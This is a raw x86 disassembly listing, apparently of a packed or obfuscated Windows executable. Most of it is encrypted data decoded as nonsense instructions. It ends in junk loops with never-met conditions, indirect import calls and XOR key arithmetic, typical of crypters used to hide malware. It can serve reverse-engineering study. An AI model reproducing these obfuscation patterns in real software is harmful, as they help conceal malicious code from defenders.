  4048d6:	ins    DWORD PTR es:[edi],dx
  4048d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4048d8:	fstp   DWORD PTR [ebx-0xd6e2995]
  4048de:	xor    edi,DWORD PTR [ecx+0x1d1ba7be]
  4048e4:	and    ebx,ebx
  4048e6:	arpl   WORD PTR [ebx+esi*2-0x5f],sp
  4048ea:	popf   
  4048eb:	sbb    cl,BYTE PTR [edx-0x4b3ee0b4]
  4048f1:	jns    0x4048bd
  4048f3:	fcmovu st,st(1)
  4048f5:	adc    DWORD PTR [ebp-0x46],0x3b
  4048f9:	xchg   BYTE PTR [ebx],dl
  4048fb:	and    BYTE PTR [ecx-0x18],dl
  4048fe:	mov    al,ds:0x449ee5d3
  404903:	cmp    eax,0x11de9a2f
  404908:	dec    edx
  404909:	ins    DWORD PTR es:[edi],dx
  40490a:	loopne 0x404982
  40490c:	lock inc esp
  40490e:	stos   DWORD PTR es:[edi],eax
  40490f:	pop    DWORD PTR [ecx]
  404911:	pop    ss
  404912:	out    dx,eax
  404913:	jg     0x4048a5
  404915:	jmp    0x4048a5
  404917:	fdivp  st(7),st
  404919:	out    dx,eax
  40491a:	es mov esi,0xbeb2fdca
  404920:	cwde   
  404921:	push   edi
  404922:	and    edi,ebp
  404924:	push   ecx
  404925:	push   ss
  404926:	sbb    eax,0xb2c7edea
  40492b:	inc    edx
  40492c:	jle    0x40491f
  40492e:	xchg   edx,eax
  40492f:	out    0x1a,eax
  404931:	or     al,0x75
  404933:	aam    0x59
  404935:	xor    DWORD PTR [edi-0x71deecbc],eax
  40493b:	jbe    0x404949
  40493d:	push   0x60
  40493f:	jecxz  0x4049a3
  404941:	mov    WORD PTR [edi],fs
  404943:	dec    ebp
  404944:	cmp    DWORD PTR [eax+0x3a],edi
  404947:	xor    cl,ah
  404949:	leave  
  40494a:	cld    
  40494b:	mov    bh,0xbf
  40494d:	stc    
  40494e:	push   cs
  40494f:	je     0x40494c
  404951:	ret    0xeaf5
  404954:	xor    al,0x27
  404956:	clc    
  404957:	add    ebp,DWORD PTR [eax+eax*4]
  40495a:	pop    eax
  40495b:	add    esp,esi
  40495d:	adc    bh,BYTE PTR [ebp-0x9f1b29e]
  404963:	(bad)  
  404964:	and    al,0xde
  404966:	push   ecx
  404967:	test   eax,0xf005c981
  40496c:	inc    esi
  40496d:	cdq    
  40496e:	mov    ebp,0x5de0ef6f
  404973:	mov    ah,0x94
  404975:	inc    ebx
  404976:	into   
  404977:	mov    ds,WORD PTR [esi]
  404979:	xchg   edi,eax
  40497a:	nop
  40497b:	outs   dx,DWORD PTR ds:[esi]
  40497c:	retf   
  40497d:	aaa    
  40497e:	or     eax,0x1e1e7948
  404983:	inc    edx
  404984:	stos   DWORD PTR es:[edi],eax
  404985:	and    al,0xce
  404987:	ret    
  404988:	mov    eax,DWORD PTR [edi]
  40498a:	les    ebx,FWORD PTR [esi+0xda8b86a]
  404990:	jg     0x4049d1
  404992:	cmp    DWORD PTR [edi-0x1fcedf7d],eax
  404998:	mov    edi,0x3210cb0d
  40499d:	lock int3 
  40499f:	fstp   st(7)
  4049a1:	jbe    0x404a02
  4049a3:	xchg   ebx,eax
  4049a4:	jno    0x4049d8
  4049a6:	or     eax,DWORD PTR [edi+esi*1+0x38b40765]
  4049ad:	fdiv   DWORD PTR [edi+0x33]
  4049b0:	jns    0x4049a5
  4049b2:	mov    DWORD PTR [edx-0x608278ac],ecx
  4049b8:	push   0x4
  4049ba:	adc    eax,0x8d3631ac
  4049bf:	sub    eax,0xbb1926f2
  4049c4:	test   eax,0x634dbb22
  4049c9:	(bad)  
  4049ca:	or     eax,0x8dcd9125
  4049cf:	mov    DWORD PTR [esi],ebx
  4049d1:	iret   
  4049d2:	retf   
  4049d3:	mov    al,0x7
  4049d5:	dec    ecx
  4049d6:	test   DWORD PTR [eax],0x13c9c93b
  4049dc:	(bad)  
  4049dd:	in     eax,dx
  4049de:	mov    ss,WORD PTR [ecx]
  4049e0:	and    al,0xfc
  4049e2:	add    ch,bl
  4049e4:	sbb    esp,DWORD PTR [edi]
  4049e6:	xchg   esi,eax
  4049e7:	dec    edi
  4049e8:	sbb    BYTE PTR [esi],ch
  4049ea:	ror    BYTE PTR [edx-0x65],1
  4049ed:	adc    al,0xcf
  4049ef:	adc    DWORD PTR [esi],0x7f
  4049f2:	data16 jo 0x4049eb
  4049f5:	lea    esi,[esi-0x7a]
  4049f8:	fcomi  st,st(6)
  4049fa:	or     bl,dl
  4049fc:	mov    WORD PTR [edi+0x75c12fa],fs
  404a02:	scas   eax,DWORD PTR es:[edi]
  404a03:	mov    fs,esp
  404a05:	lods   al,BYTE PTR ds:[esi]
  404a06:	add    BYTE PTR [eax-0x67a3d040],dl
  404a0c:	jbe    0x404a6e
  404a0e:	push   eax
  404a0f:	xor    DWORD PTR [edx+0x44],ecx
  404a12:	push   ebp
  404a13:	jb     0x404a61
  404a15:	pop    ebx
  404a16:	add    al,0x30
  404a18:	or     esp,DWORD PTR [ecx]
  404a1a:	lock cmp BYTE PTR [ecx-0x47],ch
  404a1e:	push   esi
  404a1f:	adc    eax,0x6f3a4cc
  404a24:	sbb    eax,0xeb5bae89
  404a29:	cmp    eax,0xe1895a4d
  404a2e:	shl    DWORD PTR [esi+edi*2+0x27389487],0x21
  404a36:	imul   esp,esp,0xd161ed71
  404a3c:	lahf   
  404a3d:	clc    
  404a3e:	jl     0x404a5f
  404a40:	imul   eax,DWORD PTR [ecx],0x7
  404a43:	retf   
  404a44:	in     al,dx
  404a45:	push   es
  404a46:	dec    ebp
  404a47:	inc    ecx
  404a48:	sar    DWORD PTR [ebp+0x5d],1
  404a4b:	xchg   ebp,eax
  404a4c:	je     0x404a42
  404a4e:	pop    es
  404a4f:	mov    eax,0xe6219ab5
  404a54:	inc    ebp
  404a55:	fstp   DWORD PTR [edi]
  404a57:	adc    BYTE PTR [ebx+ebp*4-0x4a14fccb],bh
  404a5e:	mov    ds:0x46d5618c,eax
  404a63:	aaa    
  404a64:	fsubp  st(0),st
  404a66:	(bad)  
  404a67:	fcmovne st,st(4)
  404a69:	test   DWORD PTR [ebx],ebx
  404a6b:	rcl    BYTE PTR [edi-0x2a],1
  404a6e:	sahf   
  404a6f:	int    0xf8
  404a71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a72:	sbb    ah,bh
  404a74:	mov    ecx,0x87bc28ce
  404a79:	dec    ecx
  404a7a:	push   esi
  404a7b:	cmp    al,0x25
  404a7d:	cmp    ah,bh
  404a7f:	jnp    0x404ad8
  404a81:	repnz mov eax,ds:0xa87cdacc
  404a87:	or     ah,bh
  404a89:	in     eax,dx
  404a8a:	mov    ah,0xd2
  404a8c:	xchg   ebp,eax
  404a8d:	xlat   BYTE PTR ds:[ebx]
  404a8e:	lahf   
  404a8f:	xchg   ebp,eax
  404a90:	jb     0x404a3c
  404a92:	maxps  xmm5,XMMWORD PTR [ebp-0x6f]
  404a96:	mov    edx,0x4a691023
  404a9b:	or     BYTE PTR [edx+0x61],dh
  404a9e:	mov    ebx,0x53724f3
  404aa3:	out    0x77,eax
  404aa5:	cld    
  404aa6:	dec    esi
  404aa7:	lods   al,BYTE PTR ds:[esi]
  404aa8:	ss stc 
  404aaa:	ins    BYTE PTR es:[edi],dx
  404aab:	pop    es
  404aac:	adc    BYTE PTR [ebp+ecx*1-0x693904d6],0xa8
  404ab4:	or     dh,BYTE PTR [edi+0x2a]
  404ab7:	push   edi
  404ab8:	sub    eax,DWORD PTR [ebx]
  404aba:	xor    BYTE PTR [edx],cl
  404abc:	sti    
  404abd:	loop   0x404a45
  404abf:	int3   
  404ac0:	or     DWORD PTR [eax-0x287e8bc5],edx
  404ac6:	arpl   WORD PTR [eax-0x74],di
  404ac9:	sbb    bh,BYTE PTR [esi+0x14]
  404acc:	dec    ebx
  404ace:	sub    bh,BYTE PTR es:[edx+0x42dfeffb]
  404ad5:	mov    cx,0x157e
  404ad9:	or     eax,0x8892fef7
  404ade:	xor    esi,DWORD PTR [edi+ecx*8]
  404ae1:	mov    esi,0x538846cc
  404ae6:	or     esp,DWORD PTR [ebx]
  404ae8:	jbe    0x404b49
  404aea:	loope  0x404b27
  404aec:	jae    0x404a98
  404aee:	mov    bh,bl
  404af0:	adc    DWORD PTR [esi],esi
  404af2:	(bad)  
  404af4:	sti    
  404af5:	xchg   BYTE PTR [edi-0x5c6213e3],dh
  404afb:	shr    BYTE PTR [edi+0x5c],cl
  404afe:	add    al,BYTE PTR ds:0x13a74da7
  404b04:	jne    0x404b76
  404b06:	lods   eax,DWORD PTR ds:[esi]
  404b07:	iret   
  404b08:	xor    al,BYTE PTR [eax+0x53]
  404b0b:	pop    ss
  404b0c:	pushf  
  404b0d:	jb     0x404b28
  404b0f:	xchg   DWORD PTR [esp+ebp*8],esp
  404b12:	add    al,0xda
  404b14:	pop    edi
  404b15:	push   eax
  404b16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b17:	in     al,0xbf
  404b19:	xchg   BYTE PTR fs:[edi+eiz*2-0x1b4bfca2],bh
  404b21:	push   esi
  404b22:	call   0xee874b7e
  404b27:	es repnz (bad) 
  404b2a:	mov    ebx,0x477cd554
  404b2f:	pop    ebx
  404b30:	xchg   DWORD PTR [ecx+0x7d05e55],edx
  404b36:	xchg   edx,eax
  404b37:	dec    esp
  404b38:	xor    ah,BYTE PTR [edx-0x4437e24b]
  404b3e:	push   edi
  404b3f:	shl    DWORD PTR [eax+eiz*2],cl
  404b42:	dec    esp
  404b43:	pop    eax
  404b44:	push   edi
  404b45:	jae    0x404ae5
  404b47:	fstp   DWORD PTR [edi]
  404b49:	(bad)
  404b4c:	mov    WORD PTR [esi-0x7f],cs
  404b4f:	xchg   edi,eax
  404b50:	add    BYTE PTR [ebx+0x17],al
  404b53:	in     eax,dx
  404b54:	jge    0x404b82
  404b56:	fdiv   DWORD PTR [edx]
  404b58:	cmp    eax,DWORD PTR [edx]
  404b5a:	jno    0x404bca
  404b5c:	xor    eax,0xe0433221
  404b61:	xor    cl,BYTE PTR [ebp+0x2f]
  404b64:	(bad)
  404b68:	mov    eax,ds:0xffae5835
  404b6d:	push   es
  404b6e:	ss enter 0xce4e,0x69
  404b73:	inc    esi
  404b74:	in     al,dx
  404b75:	stc    
  404b76:	xchg   edi,eax
  404b77:	sub    BYTE PTR [esi],dh
  404b79:	cli    
  404b7a:	jbe    0x404b29
  404b7c:	push   0x3d
  404b7e:	loope  0x404b38
  404b80:	rcl    dl,cl
  404b82:	fild   QWORD PTR [edx-0x4eec0f91]
  404b88:	outs   dx,DWORD PTR ds:[esi]
  404b89:	jg     0x404ba7
  404b8b:	push   edx
  404b8c:	adc    al,0x11
  404b8e:	rcl    esp,cl
  404b90:	in     al,0xbc
  404b92:	mov    ebx,DWORD PTR [eax]
  404b94:	pop    es
  404b95:	fs into 
  404b97:	addr16 retf 
  404b99:	adc    bl,cl
  404b9b:	fidiv  WORD PTR [edi-0x6e]
  404b9e:	scas   eax,DWORD PTR es:[edi]
  404b9f:	pop    ebp
  404ba0:	xlat   BYTE PTR ds:[ebx]
  404ba1:	pusha  
  404ba2:	push   ebx
  404ba3:	lds    ebx,FWORD PTR [edi+0x20]
  404ba6:	pusha  
  404ba7:	daa    
  404ba8:	das    
  404ba9:	mov    ch,BYTE PTR [edi]
  404bab:	call   0x24fd:0x5af630a
  404bb2:	imul   BYTE PTR [ecx-0x58]
  404bb5:	lods   al,BYTE PTR ds:[esi]
  404bb6:	cmp    al,0x7a
  404bb8:	pop    edi
  404bb9:	xor    eax,0xd74665b6
  404bbe:	aad    0x87
  404bc0:	pop    ebp
  404bc1:	cmc    
  404bc2:	push   ss
  404bc3:	cli    
  404bc4:	xor    DWORD PTR [edi],edi
  404bc6:	fcom   DWORD PTR [edi+0x65]
  404bc9:	cmp    DWORD PTR [ebx-0x544da3be],esp
  404bcf:	xchg   esp,eax
  404bd0:	jne    0x404b9a
  404bd2:	cmp    ecx,DWORD PTR [ecx-0x68]
  404bd5:	sub    BYTE PTR [ebp-0x146c81e4],bl
  404bdb:	or     dl,BYTE PTR [eax+0x75]
  404bde:	inc    edx
  404bdf:	mul    DWORD PTR [ebx+0x2411579e]
  404be5:	pushf  
  404be6:	mov    ah,0xbc
  404be8:	mov    ebp,DWORD PTR [edx+0x56f8b680]
  404bee:	adc    ch,BYTE PTR [esi+0x33aa3774]
  404bf4:	aas    
  404bf5:	jl     0x404bc5
  404bf7:	xor    cl,ah
  404bf9:	add    ebx,DWORD PTR [ebp+0x129a459f]
  404bff:	fs or  eax,0x3baa2a64
  404c05:	lods   eax,DWORD PTR ds:[esi]
  404c06:	cmp    al,BYTE PTR [edx+0x33]
  404c09:	in     al,0xda
  404c0b:	jge    0x404c6f
  404c0d:	ja     0x404be8
  404c0f:	das    
  404c10:	outs   dx,DWORD PTR ds:[esi]
  404c11:	cdq    
  404c12:	jbe    0x404bda
  404c14:	mov    ebx,0x8eb61ca5
  404c19:	jo     0x404c43
  404c1b:	push   ebp
  404c1c:	stos   DWORD PTR es:[edi],eax
  404c1d:	inc    ecx
  404c1e:	pop    edx
  404c1f:	ins    BYTE PTR es:[edi],dx
  404c20:	test   al,0xdc
  404c22:	iret   
  404c23:	dec    edx
  404c24:	inc    ecx
  404c25:	(bad)  
  404c27:	push   ecx
  404c28:	call   0x8268:0xa8e91a58
  404c2f:	fs jg  0x404c81
  404c32:	or     bh,BYTE PTR [esi]
  404c34:	cmp    eax,0x53abc2b4
  404c39:	imul   ecx,DWORD PTR [edi+0x7f],0x75
  404c3d:	push   ss
  404c3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c3f:	data16 add BYTE PTR [eax],bh
  404c42:	loopne 0x404c15
  404c44:	inc    edi
  404c45:	adc    ebx,DWORD PTR [ebx-0x79e0f994]
  404c4b:	adc    DWORD PTR [esi+0x21],esp
  404c4e:	sbb    ecx,DWORD PTR [ebp-0x66c43f20]
  404c54:	inc    ebp
  404c55:	xor    al,0xf4
  404c57:	pop    ecx
  404c58:	or     BYTE PTR [eax+0x35acf9c0],bh
  404c5e:	daa    
  404c5f:	dec    ebx
  404c60:	stos   DWORD PTR es:[edi],eax
  404c61:	jmp    0xcaeb:0xb2c8a3a3
  404c68:	mov    cl,0x57
  404c6a:	shr    BYTE PTR [esi],cl
  404c6c:	xor    edx,DWORD PTR [ebp-0x746b0f71]
  404c72:	(bad)  
  404c73:	popf   
  404c74:	sub    ebp,DWORD PTR [edx-0x5c]
  404c77:	jne    0x404c1c
  404c79:	xor    al,0x71
  404c7b:	pop    ebp
  404c7c:	cmp    BYTE PTR [edi-0x179670de],dh
  404c82:	setns  BYTE PTR [ebp+0x38]
  404c86:	sbb    ecx,eax
  404c88:	xor    DWORD PTR [ebx+eax*8+0x22],ebp
  404c8c:	(bad)  [esp+eiz*8+0x72]
  404c90:	je     0x404c83
  404c92:	adc    eax,0x1e994ca6
  404c97:	iret   
  404c98:	cmc    
  404c99:	(bad)  
  404c9a:	je     0x404c4e
  404c9c:	out    dx,eax
  404c9d:	icebp  
  404c9e:	xor    ebx,ecx
  404ca0:	imul   edi,edx,0xc22591ae
  404ca6:	add    bh,BYTE PTR [edx+0x49ed9ff]
  404cac:	pop    eax
  404cad:	leave  
  404cae:	das    
  404caf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404cb0:	icebp  
  404cb1:	int3   
  404cb2:	push   ds
  404cb3:	mov    bl,0xc0
  404cb5:	push   esi
  404cb6:	imul   BYTE PTR [ebp-0x44bc9d64]
  404cbc:	jmp    0x404c46
  404cbe:	inc    edi
  404cbf:	dec    esp
  404cc0:	fcmovnu st,st(3)
  404cc2:	fadd   DWORD PTR [edx+0x20]
  404cc5:	fmul   DWORD PTR [edi-0x18]
  404cc8:	adc    esi,esi
  404cca:	test   al,0xa
  404ccc:	fcmovnb st,st(0)
  404cce:	data16 out dx,al
  404cd0:	mov    cl,0x51
  404cd2:	int    0xea
  404cd4:	sub    BYTE PTR [ebp+0x3b67b11c],dh
  404cda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404cdb:	push   edx
  404cdc:	lahf   
  404cdd:	dec    eax
  404cde:	les    ebp,FWORD PTR [edx]
  404ce0:	xor    DWORD PTR [edx+0x7e],edx
  404ce3:	cli    
  404ce4:	rol    BYTE PTR [eax],0x11
  404ce7:	sub    al,BYTE PTR [edi+0x9]
  404cea:	fcomip st,st(6)
  404cec:	bound  edi,QWORD PTR ss:[ebp-0x48200475]
  404cf3:	cmp    edx,0xcf37702b
  404cf9:	mov    ebp,0x717d305
  404cfe:	lods   eax,DWORD PTR ds:[esi]
  404cff:	pop    ss
  404d00:	sbb    bl,BYTE PTR [edx-0x40]
  404d03:	xor    al,0x92
  404d05:	cmc    
  404d06:	jmp    0x575a:0xc1085a22
  404d0d:	bound  ebx,QWORD PTR [esp+esi*1-0xd3127d1]
  404d14:	jecxz  0x404d93
  404d16:	leave  
  404d17:	scas   eax,DWORD PTR es:[edi]
  404d18:	mov    eax,0x2a4e2acf
  404d1d:	(bad)  
  404d1e:	popf   
  404d1f:	push   ecx
  404d20:	mov    al,0xc4
  404d22:	in     eax,0xa6
  404d24:	mov    edi,0x1d1e6bf9
  404d29:	xchg   edi,eax
  404d2a:	(bad)  
  404d2b:	std    
  404d2c:	out    0xc2,eax
  404d2e:	rcl    DWORD PTR [eax-0x1eee2c43],0x24
  404d35:	jp     0x404da4
  404d37:	or     eax,0x3bb3569a
  404d3c:	jae    0x404cfc
  404d3e:	and    edx,DWORD PTR [edx]
  404d40:	test   BYTE PTR [edx],bh
  404d42:	or     DWORD PTR ds:0xda393a08,edx
  404d48:	jl     0x404d6a
  404d4a:	icebp  
  404d4b:	pop    ecx
  404d4c:	sub    dl,BYTE PTR [esi]
  404d4e:	and    cl,BYTE PTR [ebx-0x65]
  404d51:	fucomip st,st(2)
  404d53:	mov    bl,BYTE PTR [esi-0x63e8d6d2]
  404d59:	les    edi,FWORD PTR [ebp-0x51]
  404d5c:	cmc    
  404d5d:	push   cs
  404d5e:	pop    ss
  404d5f:	jg     0x404d1a
  404d61:	test   BYTE PTR gs:[edi],ch
  404d64:	dec    edi
  404d65:	mov    eax,ds:0x6d89425b
  404d6a:	adc    eax,0x3ff8380c
  404d6f:	pusha  
  404d70:	jae    0x404d6a
  404d72:	mov    ebx,0x58f1a622
  404d77:	scas   eax,DWORD PTR es:[edi]
  404d78:	sbb    eax,0x23d1af41
  404d7d:	or     dh,BYTE PTR [ebx+0x32cdb2e2]
  404d83:	or     al,0xe0
  404d85:	out    dx,al
  404d86:	sbb    esp,DWORD PTR [edx]
  404d88:	(bad)  
  404d89:	mov    al,ds:0x74cfa09
  404d8e:	int3   
  404d8f:	ins    BYTE PTR es:[edi],dx
  404d90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d91:	and    al,0x9e
  404d93:	in     eax,dx
  404d94:	loop   0x404dea
  404d96:	call   0x173b:0x94cd163f
  404d9d:	mov    ah,0xf1
  404d9f:	xor    dl,BYTE PTR [edx]
  404da1:	cs xchg ebp,eax
  404da3:	test   al,0x71
  404da5:	fcom   DWORD PTR [ebx-0x17ecbe3f]
  404dab:	js     0x404d57
  404dad:	or     DWORD PTR [ebx-0x34fb825a],ecx
  404db3:	push   ebx
  404db4:	cmp    DWORD PTR [ecx],edx
  404db6:	bound  esi,QWORD PTR [edx+ebx*8]
  404db9:	rcl    BYTE PTR [edi],1
  404dbb:	fdiv   DWORD PTR [edx+0x51]
  404dbe:	inc    esp
  404dbf:	and    al,BYTE PTR [edi+esi*4]
  404dc2:	pop    ss
  404dc3:	es push esi
  404dc5:	mov    dl,0x41
  404dc7:	mov    es,WORD PTR [edx+0x700f579e]
  404dcd:	adc    BYTE PTR [edx+eax*1],cl
  404dd0:	imul   ebx,DWORD PTR [edx],0xffffffe0
  404dd3:	fiadd  DWORD PTR [ebx+0x1]
  404dd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404dd7:	fidivr WORD PTR [ecx-0x2b02980f]
  404ddd:	lea    edx,[ebx-0x2c]
  404de0:	imul   edx,ecx,0x22
  404de3:	lds    esi,FWORD PTR [esi+0x55]
  404de6:	into   
  404de7:	or     eax,0xa3d7d744
  404dec:	sub    al,0xba
  404dee:	(bad)  [edi+0x69771653]
  404df4:	addr16 jp 0x404d7d
  404df7:	and    eax,0xd8840f
  404dfc:	add    BYTE PTR [eax],al
  404dfe:	and    eax,DWORD PTR ds:0x42b010
  404e04:	mov    eax,DWORD PTR [ebp+0x14]
  404e07:	and    DWORD PTR ds:0x42901c,0x0
  404e11:	jmp    0x404e23
  404e16:	mov    ebx,DWORD PTR ds:0x42901c
  404e1c:	inc    ebx
  404e1d:	mov    DWORD PTR ds:0x42901c,ebx
  404e23:	cmp    DWORD PTR ds:0x42901c,0x11
  404e2a:	jae    0x404e6a
  404e30:	cmp    DWORD PTR ds:0x42901c,0x1a
  404e37:	jne    0x404e53
  404e3d:	push   DWORD PTR [ebp-0x18]
  404e40:	push   DWORD PTR [ebp-0x28]
  404e43:	push   0x42e0e0
  404e48:	push   0x400000
  404e4d:	call   DWORD PTR ds:0x42e8eb
  404e53:	jmp    0x404e16
  404e58:	mov    ebx,DWORD PTR ds:0x42a01c
  404e5e:	sub    ebx,DWORD PTR ds:0x42d008
  404e64:	mov    DWORD PTR ds:0x42a01c,ebx
  404e6a:	mov    eax,DWORD PTR [eax]
  404e6c:	and    DWORD PTR ds:0x42b01c,0x0
  404e76:	mov    ebx,DWORD PTR ds:0x42b01c
  404e7c:	inc    ebx
  404e7d:	mov    DWORD PTR ds:0x42b01c,ebx
  404e83:	cmp    DWORD PTR ds:0x42b01c,0x6
  404e8a:	jne    0x404e96
  404e90:	call   DWORD PTR ds:0x42e8ef
  404e96:	cmp    DWORD PTR ds:0x42b01c,0x5
  404e9d:	jne    0x404eb2
  404ea3:	xor    ebx,ebx
  404ea5:	or     ebx,DWORD PTR ds:0x42b01c
  404eab:	inc    ebx
  404eac:	mov    DWORD PTR ds:0x42b01c,ebx
  404eb2:	cmp    DWORD PTR ds:0x42b01c,0x12
  404eb9:	jb     0x404e76
  404ebf:	xor    ebx,ebx
  404ec1:	or     ebx,DWORD PTR ds:0x429000
  404ec7:	add    ebx,DWORD PTR ds:0x42d014
  404ecd:	mov    DWORD PTR ds:0x429000,ebx
  404ed3:	mov    DWORD PTR [ebp-0x1c],eax
  404ed6:	mov    eax,ds:0x41cd65
  404edb:	mov    ebx,DWORD PTR ds:0x41ce0c
  404ee1:	sub    ebx,eax
  404ee3:	or     eax,DWORD PTR [eax+ebx*1]
  404ee6:	mov    eax,DWORD PTR [ebp-0x4]
  404ee9:	mov    DWORD PTR ds:0x42900c,0x13
  404ef3:	cmp    DWORD PTR ds:0x42900c,0x0
  404efa:	je     0x404f3f
  404f00:	cmp    DWORD PTR ds:0x42900c,0xa
  404f07:	jne    0x404f13
  404f0d:	call   DWORD PTR ds:0x42e8f3
  404f13:	cmp    DWORD PTR ds:0x42900c,0xb
  404f1a:	jne    0x404f2d
  404f20:	mov    ebx,DWORD PTR ds:0x42900c
  404f26:	dec    ebx
  404f27:	mov    DWORD PTR ds:0x42900c,ebx
  404f2d:	mov    ebx,DWORD PTR ds:0x42900c
  404f33:	dec    ebx
  404f34:	mov    DWORD PTR ds:0x42900c,ebx
  404f3a:	jmp    0x404ef3
  404f3f:	xor    eax,esi
  404f41:	add    ebx,0x5bdd
  404f47:	add    eax,edi
  404f49:	mov    DWORD PTR [ebp-0x8],eax
  404f4c:	and    ebx,eax
  404f4e:	mov    eax,DWORD PTR [ebp-0xc]
  404f51:	sbb    DWORD PTR ds:0x42a000,ecx
  404f57:	xor    eax,esi
  404f59:	add    eax,edi
  404f5b:	and    DWORD PTR ds:0x42b018,0x0
  404f65:	mov    ebx,DWORD PTR ds:0x42b018
  404f6b:	inc    ebx
  404f6c:	mov    DWORD PTR ds:0x42b018,ebx
  404f72:	cmp    DWORD PTR ds:0x42b018,0x1f
  404f79:	jne    0x404f8a
  404f7f:	push   0x42e0ac
  404f84:	call   DWORD PTR ds:0x42e8f7
  404f8a:	cmp    DWORD PTR ds:0x42b018,0x12
  404f91:	jb     0x404f65
  404f97:	mov    DWORD PTR [ebp-0x24],eax
  404f9a:	mov    eax,DWORD PTR [ebp-0x4]
  404f9d:	xor    eax,esi
  404f9f:	add    eax,edi
  404fa1:	mov    DWORD PTR [ebp-0x30],eax
  404fa4:	mov    ebx,DWORD PTR [ebp-0x4]
  404fa7:	mov    eax,ds:0x41cd79
  404fac:	mov    eax,DWORD PTR [eax]
  404fae:	xor    DWORD PTR ds:0x42900c,eax
  404fb4:	xor    ebx,esi
  404fb6:	add    ebx,edi
  404fb8:	mov    DWORD PTR ds:0x42c01c,0x1a
  404fc2:	cmp    DWORD PTR ds:0x42c01c,0x0
  404fc9:	je     0x4050fc
  404fcf:	cmp    DWORD PTR ds:0x42c01c,0x3
  404fd6:	jne    0x404fe7
  404fdc:	push   0x42e018
  404fe1:	call   DWORD PTR ds:0x42e8fb
  404fe7:	cmp    DWORD PTR ds:0x42c01c,0x4
  404fee:	jne    0x404fff
  404ff4:	mov    eax,ds:0x42c01c
  404ff9:	dec    eax
  404ffa:	mov    ds:0x42c01c,eax
  404fff:	mov    eax,ds:0x42c01c
  405004:	dec    eax
  405005:	mov    ds:0x42c01c,eax
  40500a:	jmp    0x404fc2
  40500f:	mov    DWORD PTR ds:0x42b010,0x1e
  405019:	cmp    DWORD PTR ds:0x42b010,0x0
  405020:	je     0x4050fc
  405026:	cmp    DWORD PTR ds:0x42b010,0x29
  40502d:	jne    0x405039
  405033:	call   DWORD PTR ds:0x42e8ff
  405039:	mov    eax,ds:0x42b010
  40503e:	dec    eax
  40503f:	mov    ds:0x42b010,eax
  405044:	jmp    0x405019
  405049:	mov    DWORD PTR ds:0x42a004,0x16
  405053:	cmp    DWORD PTR ds:0x42a004,0x0
  40505a:	je     0x4050fc
  405060:	cmp    DWORD PTR ds:0x42a004,0xb
  405067:	jne    0x405082
  40506d:	push   0x6cef
  405072:	push   0x42a000
  405077:	push   0x4fd9
  40507c:	call   DWORD PTR ds:0x42e903
  405082:	cmp    DWORD PTR ds:0x42a004,0xc
  405089:	jne    0x40509a
  40508f:	mov    eax,ds:0x42a004
  405094:	dec    eax
  405095:	mov    ds:0x42a004,eax
  40509a:	mov    eax,ds:0x42a004
  40509f:	dec    eax
  4050a0:	mov    ds:0x42a004,eax
  4050a5:	jmp    0x405053
  4050aa:	mov    DWORD PTR ds:0x42901c,0x1f
  4050b4:	cmp    DWORD PTR ds:0x42901c,0x0
  4050bb:	je     0x4050fc
  4050c1:	cmp    DWORD PTR ds:0x42901c,0x22
  4050c8:	jne    0x4050e2
  4050ce:	push   DWORD PTR [ebp-0x1c]
  4050d1:	push   0x7ea8
  4050d6:	push   DWORD PTR [ebp-0x10]
  4050d9:	push   DWORD PTR [ebp-0x28]
  4050dc:	call   DWORD PTR ds:0x42e8c3
  4050e2:	mov    eax,ds:0x42901c
  4050e7:	dec    eax
  4050e8:	mov    ds:0x42901c,eax
  4050ed:	jmp    0x4050b4
  4050f2:	and    DWORD PTR ds:0x42d008,0x7d7b
  4050fc:	mov    eax,DWORD PTR [ebp-0x24]
  4050ff:	sub    eax,edi
  405101:	lea    ecx,[ebx-0x3272e2]
  405107:	and    DWORD PTR ds:0x42d00c,0x483b
  405111:	xor    eax,esi
  405113:	sub    DWORD PTR ds:0x42a000,0x7f75
  40511d:	xor    ecx,esi
  40511f:	cmp    ecx,eax
  405121:	mov    DWORD PTR ds:0x429010,0x207a
  40512b:	je     0x405268
  405131:	mov    eax,DWORD PTR [ebp-0x4]
  405134:	add    DWORD PTR ds:0x42a004,0x429018
  40513e:	xor    eax,esi
  405140:	add    eax,edi
  405142:	mov    DWORD PTR ds:0x42d010,0x65f6
  40514c:	cmp    ebx,eax
  40514e:	mov    DWORD PTR ds:0x42b00c,0x5c1b
  405158:	jne    0x405245
  40515e:	or     DWORD PTR ds:0x42a018,0x42d00c
  405168:	push   DWORD PTR [ebp+0x8]
  40516b:	sbb    DWORD PTR ds:0x429020,0x6ddf
  405175:	call   0x402803
  40517a:	mov    DWORD PTR ds:0x42a014,0x17
  405184:	cmp    DWORD PTR ds:0x42a014,0x0
  40518b:	je     0x4051de
  405191:	cmp    DWORD PTR ds:0x42a014,0xc
  405198:	jne    0x4051b2
  40519e:	push   0x42d5
  4051a3:	push   DWORD PTR [ebp-0x20]
  4051a6:	push   DWORD PTR [ebp-0x24]
  4051a9:	push   DWORD PTR [ebp-0x28]
  4051ac:	call   DWORD PTR ds:0x42e8c7
  4051b2:	cmp    DWORD PTR ds:0x42a014,0xd
  4051b9:	jne    0x4051cc
  4051bf:	mov    ecx,DWORD PTR ds:0x42a014
  4051c5:	dec    ecx
  4051c6:	mov    DWORD PTR ds:0x42a014,ecx
  4051cc:	mov    ecx,DWORD PTR ds:0x42a014
  4051d2:	dec    ecx
  4051d3:	mov    DWORD PTR ds:0x42a014,ecx
  4051d9:	jmp    0x405184
  4051de:	mov    DWORD PTR [ebp-0x14],eax
  4051e1:	mov    eax,DWORD PTR [ebp-0x4]
  4051e4:	mov    ecx,DWORD PTR [ebp-0x14]
  4051e7:	xor    eax,esi
  4051e9:	add    eax,edi
  4051eb:	cmp    ecx,eax
  4051ed:	je     0x4052d3
  4051f3:	push   DWORD PTR [ebp-0x14]
  4051f6:	push   DWORD PTR [ebp+0x8]
  4051f9:	call   0x40ea45
  4051fe:	mov    DWORD PTR [ebp-0x14],eax
  405201:	mov    eax,DWORD PTR [ebp-0x4]
